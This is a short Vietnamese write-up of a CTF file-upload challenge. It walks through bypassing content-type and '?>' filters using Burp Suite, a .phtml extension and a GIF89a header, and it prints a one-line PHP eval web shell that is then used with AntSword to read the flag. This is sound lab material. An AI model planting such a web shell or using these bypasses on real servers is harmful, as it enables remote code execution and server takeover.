Challenge lần này là dạng upload file vuln

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/6551a2a9-8846-4992-bccc-0146e186668c)

Mình thử upload 1 file php với content 

```php
<?php phpinfo()?>
```

Và kết quả là challenge hình như đã filter content-type là php

![Screenshot 2023-12-31 153432](https://github.com/Llam-a/BUUCTF/assets/115911041/cfb2214a-89f1-4fa6-b3cc-bae8992fb28e)

Mình dùng burp suite để bắt package

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/fa4ac3c9-ba89-40e9-87e0-f65bb58f62ff)

Mình nghĩ vấn đề là ở content-type, nên mình sẽ đổi sang là `image/jpeg`, nhưng kết quả chẳng khá hơn

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f57c0580-b532-4573-bb9d-af93baf347f4)

Sau đó mình thử đổi đuôi file upload extension thành phtml, nhưng challenge đã filter `?>`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/0ac53cb3-1376-4a45-b4e2-e64e3e566202)

Sửa lại Trojan

```php
GIF89a
<script language='php'>eval($_POST['shell'];</script>
```

File của mình đã upload thành công

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/394f242e-6279-4dcc-99e8-f9cb7d03428b)

Dùng antsword để đọc flag

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e881d8a9-1d71-4ca9-883d-0d50457cdb67)

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f3e23977-fa47-4bc1-9223-ff9d82cf4489)




